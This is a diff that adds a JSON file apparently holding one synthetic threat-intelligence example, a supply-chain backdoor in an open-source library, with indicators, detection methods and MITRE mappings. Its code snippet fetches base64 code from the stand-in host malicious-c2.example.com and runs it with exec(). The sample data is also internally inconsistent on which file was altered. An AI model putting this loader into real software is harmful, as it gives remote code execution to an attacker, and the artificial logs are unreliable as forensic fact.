@@ -1,0 +1,53 @@
+{
+  "examples": [
+    {
+      "scenario": "Compromise of a widely used open-source software library by injecting a malicious backdoor in the latest release, causing downstream applications to execute unauthorized remote commands.",
+      "technical_data": {
+        "software_release_manifest": {
+          "version": "3.2.1",
+          "files": [
+            {
+              "path": "src/utils/crypto_helper.py",
+              "sha256": "b1946ac92492d2347c6235b4d2611184b4d8f5e1e5d9f4d6a8d7c3e6a7f1a9e3"
+            },
+            {
+              "path": "src/network/connection_manager.py",
+              "sha256": "f9c3aee0e5d4c908e8dbed2296e6eb6b7e3ee19a1d5e3ef6bcfd3a0a4a4b4f7f"
+            }
+          ],
+          "signature": "MEUCIQD3vFjV9EHW3b4vMo5WNc7YxlJcXJX+0uWq7+Gv9qG8E9AIgP2C2XlfqgI3E1k0Hq3JxX2h0eqldxXQ2a4rM8R+Exg7U="
+        },
+        "malicious_code_snippet": "def update_remote_config():\n    import requests, base64\n    url = 'https://malicious-c2.example.com/config'\n    headers = {'Authorization': 'Bearer abc123token'}\n    resp = requests.get(url, headers=headers)\n    if resp.status_code == 200:\n        exec(base64.b64decode(resp.text))\n\n# Injected backdoor trigger\nif __name__ == '__main__':\n    update_remote_config()",
+        "git_commit_log": "commit 9c2a7e5f3d6c4b9a1a3d8e1f7b6c5d4e2f3a9b8c\nAuthor: John Doe <john.doe@opensource.io>\nDate:   Tue Apr 23 14:37:11 2024 +0000\n\n    Fix: improve connection_manager error handling\n\n    Modified src/network/connection_manager.py\n\n    [Injected backdoor: added update_remote_config function]",
+        "hashes": {
+          "malicious_file": {
+            "md5": "6f5902ac237024bdd0c176cb93063dc4",
+            "sha1": "3f786850e387550fdab836ed7e6dc881de23001b",
+            "sha256": "b1946ac92492d2347c6235b4d2611184b4d8f5e1e5d9f4d6a8d7c3e6a7f1a9e3"
+          }
+        },
+        "downstream_application_log": "[2024-05-02 10:15:43] INFO Connecting to update server\n[2024-05-02 10:15:43] DEBUG Sending GET request to https://malicious-c2.example.com/config\n[2024-05-02 10:15:43] WARNING Unexpected code execution detected\n[2024-05-02 10:15:44] INFO Update completed successfully",
+        "network_packet_capture_excerpt": "Frame 1234: 150 bytes on wire (1200 bits), 150 bytes captured (1200 bits)\nEthernet II, Src: 00:0a:95:9d:68:16, Dst: 00:0c:29:48:8e:35\nInternet Protocol Version 4, Src: 192.168.1.50, Dst: 172.217.6.78\nTransmission Control Protocol, Src Port: 54321, Dst Port: 443, Seq: 1, Ack: 1\nSecure Sockets Layer\n    TLSv1.2 Record Layer: Application Data Protocol\nHypertext Transfer Protocol\n    GET /config HTTP/1.1\r\n    Host: malicious-c2.example.com\r\n    Authorization: Bearer abc123token\r\n    User-Agent: python-requests/2.25.1\r\n    Accept-Encoding: gzip, deflate\r\n    Accept: */*\r\n    Connection: keep-alive\r\n\r\n",
+        "process_creation_log": "2024-05-02T10:15:43.123Z host1 audit: pid=4623 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd=/home/user/src/network comm=python exe=/usr/bin/python3 args=python connection_manager.py'",
+        "code_signing_log": "2024-04-23T14:37:11Z signature verification failed for src/network/connection_manager.py: signature does not match known good key",
+        "vendor_risk_report_excerpt": "Vendor: OpenLibUtils\nLast assessment: 2024-03-15\nFlagged issues: None until 2024-04-23 when unverified commit detected\nRecommendation: Implement stricter code review and automated signature verification"
+      },
+      "indicators": [
+        "SHA256 hash b1946ac92492d2347c6235b4d2611184b4d8f5e1e5d9f4d6a8d7c3e6a7f1a9e3 of crypto_helper.py does not match previous release",
+        "Outbound HTTPS request to suspicious domain malicious-c2.example.com with uncommon bearer token",
+        "Signature verification failure for code commit 9c2a7e5f3d6c4b9a1a3d8e1f7b6c5d4e2f3a9b8c",
+        "Unusual process execution chain: python process executing network module contacting external C2",
+        "Unexpected exec() calls decoding base64-encoded payloads from remote server"
+      ],
+      "detection_method": "Automated SBOM comparison and signature verification alerts on CI/CD pipeline; network monitoring for unusual outbound HTTPS to unknown domains; EDR detecting suspicious python exec() calls with base64 payloads; audit logs showing unreviewed or unsigned commits in vendor repository.",
+      "relevant_mitre_techniques": [
+        "T1195 - Supply Chain Compromise",
+        "T1204 - User Execution",
+        "T1059 - Command and Scripting Interpreter",
+        "T1071 - Application Layer Protocol",
+        "T1553 - Subvert Trust Controls",
+        "T1110 - Brute Force (for token guessing on C2)"
+      ]
+    }
+  ]
+}
